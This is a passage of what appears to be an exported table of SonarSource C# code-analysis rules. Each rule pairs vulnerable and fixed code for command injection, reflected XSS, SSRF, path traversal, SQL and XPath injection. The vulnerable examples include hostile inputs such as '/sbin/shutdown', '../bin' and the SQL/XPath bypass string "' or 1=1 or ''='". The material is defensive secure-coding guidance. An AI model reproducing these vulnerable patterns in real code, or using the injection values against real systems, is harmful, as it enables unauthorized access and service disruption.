    // If the value ""/sbin/shutdown"" is passed as binary and the web server is running as root,
    // then the machine running the web server will be shut down and become unavailable for future requests

    Process p = new Process();
    p.StartInfo.FileName = binary; // Noncompliant
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    return Content(output);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class CommandInjection : Controller
{
  // GET /CommandInjection/Run
  public IActionResult Run(string binary)
  {
    // Restrict to binaries within the current working directory whose name only contains letters
    if (binary == null || !Regex.IsMatch(binary, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    Process p = new Process();
    p.StartInfo.FileName = binary; // Now safe
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    return Content(output);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",OS commands should not be vulnerable to injection attacks,[],BLOCKER,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:31+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string name = Request.QueryString[""name""];
Response.Write(""Hello "" + name); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
string name = Request.QueryString[""name""];
name = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(name, true);
Response.Write(""Hello "" + name);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",roslyn.sonaranalyzer.security.cs:S5131,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Endpoints reflecting
back tainted data could allow attackers to inject code that would eventually be executed in the user's browser. This could enable a wide range of
serious attacks like accessing/modifying sensitive information or impersonating other users.</p>
<p>Typically, the solution is one of the following:</p>
<ul>
  <li> Validate user provided data based on a whitelist and reject input that's not whitelisted. </li>
  <li> Sanitize user provided data from any characters that can be used for malicious purposes. </li>
  <li> Encode user provided data being reflected as output. Adjust the encoding to the output context so that, for example, HTML encoding is used for
  HTML content, HTML attribute encoding is used for attribute values, and JavaScript encoding is used for server-generated JavaScript. </li>
</ul>
<p>When sanitizing or encoding data, it is recommended to only use libraries specifically designed for security purposes. Also, make sure that the
library you are using is being actively maintained and is kept up-to-date with the latest discovered vulnerabilities.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string name = Request.QueryString[""name""];
Response.Write(""Hello "" + name); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
string name = Request.QueryString[""name""];
name = System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode(name, true);
Response.Write(""Hello "" + name);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md"">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/80.html"">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/81.html"">MITRE, CWE-81</a> - Improper Neutralization of Script in an Error Message Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/82.html"">MITRE, CWE-82</a> - Improper Neutralization of Script in Attributes of IMG Tags in a
  Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/83.html"">MITRE, CWE-83</a> - Improper Neutralization of Script in Attributes in a Web Page
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/84.html"">MITRE, CWE-84</a> - Improper Neutralization of Encoded URI Schemes in a Web Page </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/85.html"">MITRE, CWE-85</a> - Doubled Character XSS Manipulations </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/86.html"">MITRE, CWE-86</a> - Improper Neutralization of Invalid Characters in Identifiers in
  Web Pages </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/87.html"">MITRE, CWE-87</a> - Improper Neutralization of Alternate XSS Syntax </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks,[],BLOCKER,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:31+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class SSRF : Controller
{
  public IActionResult Test(string url)
  {
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url); // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class SSRF : Controller
{
  private string[] whiteList = { ""https://www.sonarsource.com"" };

  public IActionResult Test(string url)
  {
    // Match the incoming URL against a whitelist
    if (!whiteList.Contains(url))
    {
      return BadRequest();
    }

    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",roslyn.sonaranalyzer.security.cs:S5144,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. A remote server
making requests to URLs based on tainted data could enable attackers to make arbitrary requests to the internal network or to the local file
system.</p>
<p>The problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not send requests based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class SSRF : Controller
{
  public IActionResult Test(string url)
  {
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url); // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class SSRF : Controller
{
  private string[] whiteList = { ""https://www.sonarsource.com"" };

  public IActionResult Test(string url)
  {
    // Match the incoming URL against a whitelist
    if (!whiteList.Contains(url))
    {
      return BadRequest();
    }

    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Server_Side_Request_Forgery"">OWASP Attack Category</a> - Server Side Request Forgery </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/918.html"">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources
  </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",Server-side requests should not be vulnerable to forging attacks,[],MAJOR,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2018-06-18T12:48:48+0200,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class PathTraversal : Controller
{
  // GET /PathTraversal/Authenticate
  public IActionResult Authenticate(string user)
  {
    bool userExists = System.IO.File.Exists(""/home/"" + user); // Noncompliant

    // If the special value ""../bin"" is passed as user, authentication is bypassed
    // Indeed, if it passed as a user, the path becomes:
    // /bin
    // which exists on most Linux / BSD / Mac OS distributions

    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class PathTraversal : Controller
{
  // GET /PathTraversal/Authenticate
  public IActionResult Authenticate(string user)
  {
    // Restrict the username to letters and digits only
    if (!Regex.IsMatch(user, ""^[a-zA-Z0-9]+$""))
    {
        return BadRequest();
    }

    bool userExists = System.IO.File.Exists(""/home/"" + user); // Now safe
    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",roslyn.sonaranalyzer.security.cs:S2083,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Constructing file
system paths directly from tainted data could enable an attacker to inject specially crafted values, such as <code>'../'</code>, that change the
initial path and, when accessed, resolve to a path on the filesystem where the user should normally not have access.</p>
<p>A successful attack might give an attacker the ability to read, modify, or delete sensitive information from the file system and sometimes even
execute arbitrary operating system commands. This is often referred to as a ""path traversal"" or ""directory traversal"" attack.</p>
<p>The mitigation strategy should be based on the whitelisting of allowed paths or characters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class PathTraversal : Controller
{
  // GET /PathTraversal/Authenticate
  public IActionResult Authenticate(string user)
  {
    bool userExists = System.IO.File.Exists(""/home/"" + user); // Noncompliant

    // If the special value ""../bin"" is passed as user, authentication is bypassed
    // Indeed, if it passed as a user, the path becomes:
    // /bin
    // which exists on most Linux / BSD / Mac OS distributions

    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class PathTraversal : Controller
{
  // GET /PathTraversal/Authenticate
  public IActionResult Authenticate(string user)
  {
    // Restrict the username to letters and digits only
    if (!Regex.IsMatch(user, ""^[a-zA-Z0-9]+$""))
    {
        return BadRequest();
    }

    bool userExists = System.IO.File.Exists(""/home/"" + user); // Now safe
    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/22"">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/23"">MITRE, CWE-23</a> - Relative Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/36"">MITRE, CWE-36</a> - Absolute Path Traversal </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/99"">MITRE, CWE-99</a> - Improper Control of Resource Identifiers ('Resource Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/641.html"">MITRE, CWE-641</a> - Improper Restriction of Names for Files and Other Resources </li>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",I/O function calls should not be vulnerable to path injection attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2017-07-28T12:37:58+0200,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class SqlInjection : Controller
{
  private readonly UsersContext _context;

  public SqlInjection(UsersContext context)
  {
    _context = context;
  }

  // GET /SqlInjection/Authenticate
  public IActionResult Authenticate(string user)
  {
    var query = ""SELECT * FROM Users WHERE Username = '"" + user + ""'""; // Unsafe
    var userExists = _context.Users.FromSql(query).Any(); // Noncompliant

    // An attacker can bypass authentication by setting user to this special value
    user = ""' or 1=1 or ''='"";

    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class SqlInjection : Controller
{
  private readonly UsersContext _context;

  public SqlInjection(UsersContext context)
  {
    _context = context;
  }

  // GET /SqlInjection/Authenticate
  public IActionResult Authenticate(string user)
  {
    var query = ""SELECT * FROM Users WHERE Username = {0}""; // Safe
    var userExists = _context.Users.FromSql(query, user).Any();
    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",roslyn.sonaranalyzer.security.cs:S3649,cs,C#,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing SQL queries directly from tainted data
enables attackers to inject specially crafted values that change the initial meaning of the query itself. Successful SQL injection attacks can read,
modify, or delete sensitive information from the database and sometimes even shut it down or execute arbitrary operating system commands.</p>
<p>Typically, the solution is to rely on prepared statements rather than string concatenation to inject tainted data into SQL queries, which ensures
that they will be properly escaped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class SqlInjection : Controller
{
  private readonly UsersContext _context;

  public SqlInjection(UsersContext context)
  {
    _context = context;
  }

  // GET /SqlInjection/Authenticate
  public IActionResult Authenticate(string user)
  {
    var query = ""SELECT * FROM Users WHERE Username = '"" + user + ""'""; // Unsafe
    var userExists = _context.Users.FromSql(query).Any(); // Noncompliant

    // An attacker can bypass authentication by setting user to this special value
    user = ""' or 1=1 or ''='"";

    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class SqlInjection : Controller
{
  private readonly UsersContext _context;

  public SqlInjection(UsersContext context)
  {
    _context = context;
  }

  // GET /SqlInjection/Authenticate
  public IActionResult Authenticate(string user)
  {
    var query = ""SELECT * FROM Users WHERE Username = {0}""; // Safe
    var userExists = _context.Users.FromSql(query, user).Any();
    return Content(userExists ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/89"">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/564.html"">MITRE, CWE-564</a> - SQL Injection: Hibernate </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/943.html"">MITRE, CWE-943</a> - Improper Neutralization of Special Elements in Data Query Logic
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PgIRAg"">CERT, IDS00-J.</a> - Prevent SQL injection </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",SQL queries should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1', 'sans-top25-insecure', 'sql']",VULNERABILITY
2018-06-18T12:48:48+0200,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class XPathInjection : Controller
{
  public XmlDocument doc { get; set; }

  // GET /XPathInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Unsafe

    // An attacker can bypass authentication by setting user to this special value
    user = ""' or 1=1 or ''='"";

    return Content(doc.SelectSingleNode(expression) != null ? ""success"" : ""fail""); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class XPathInjection : Controller
{
  public XmlDocument doc { get; set; }

  // GET /XPathInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    // Restrict the username and password to letters only
    if (!Regex.IsMatch(user, ""^[a-zA-Z]+$"") || !Regex.IsMatch(pass, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Now safe
    return Content(doc.SelectSingleNode(expression) != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",roslyn.sonaranalyzer.security.cs:S2091,cs,C#,"<p>User provided data, such as URL parameters, should always be considered untrusted and tainted. Constructing XPath expressions directly from tainted
data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath injection
attacks can read sensitive information from XML documents.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class XPathInjection : Controller
{
  public XmlDocument doc { get; set; }

  // GET /XPathInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Unsafe

    // An attacker can bypass authentication by setting user to this special value
    user = ""' or 1=1 or ''='"";

    return Content(doc.SelectSingleNode(expression) != null ? ""success"" : ""fail""); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class XPathInjection : Controller
{
  public XmlDocument doc { get; set; }

  // GET /XPathInjection/Authenticate
  public IActionResult Authenticate(string user, string pass)
  {
    // Restrict the username and password to letters only
    if (!Regex.IsMatch(user, ""^[a-zA-Z]+$"") || !Regex.IsMatch(pass, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']""; // Now safe
    return Content(doc.SelectSingleNode(expression) != null ? ""success"" : ""fail"");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",XPath expressions should not be vulnerable to injection attacks,[],BLOCKER,"['cert', 'cwe', 'owasp-a1']",VULNERABILITY
2014-06-06T12:02:00+0200,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true)
{
  DoSomething();
}
...
if (false)
{
  DoSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=csharpsquid%3AS2583'>S2583</a> instead.</p>",csharpsquid:S1145,cs,C#,"<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true)
{
  DoSomething();
}
...
if (false)
{
  DoSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use {rule:csharpsquid:S2583} instead.</p>","Useless ""if(true) {...}"" and ""if(false){...}"" blocks should be removed",[],MAJOR,"['cwe', 'misra']",BUG
2017-07-28T12:37:58+0200,"<p>Properties are accessed like fields which makes them easier to use.</p>
<p>This rule raises an issue when the name of a <code>public</code> or <code>protected</code> method starts with <code>Get</code>, takes no parameter,
and returns a value that is not an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string GetName()  // Noncompliant
        {
            return name;
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string Name
        {
            get
            {
                return name;
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't raise an issue when the method:</p>
<ul>
  <li> Is a constructor </li>
  <li> Is an <code>override</code> </li>
  <li> Is an interface implementation </li>
  <li> Is <code>async</code> </li>
  <li> Returns <code>Task</code>, <code>Task&lt;T&gt;</code> </li>
  <li> Is named <code>GetEnumerator</code>, <code>GetAwaiter</code> </li>
</ul>",csharpsquid:S4049,cs,C#,"<p>Properties are accessed like fields which makes them easier to use.</p>
<p>This rule raises an issue when the name of a <code>public</code> or <code>protected</code> method starts with <code>Get</code>, takes no parameter,
and returns a value that is not an array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string GetName()  // Noncompliant
        {
            return name;
        }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
using System;

namespace MyLibrary
{
    public class Foo
    {
        private string name;

        public string Name
        {
            get
            {
                return name;
            }
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't raise an issue when the method:</p>
<ul>
  <li> Is a constructor </li>
  <li> Is an <code>override</code> </li>
  <li> Is an interface implementation </li>
  <li> Is <code>async</code> </li>
  <li> Returns <code>Task</code>, <code>Task&lt;T&gt;</code> </li>
  <li> Is named <code>GetEnumerator</code>, <code>GetAwaiter</code> </li>
</ul>",Properties should be preferred,[],MINOR,['convention'],CODE_SMELL
2018-11-29T11:10:36+0100,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint via .Net Framework MVC Controllers. It guides security code reviews to security-sensitive
code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
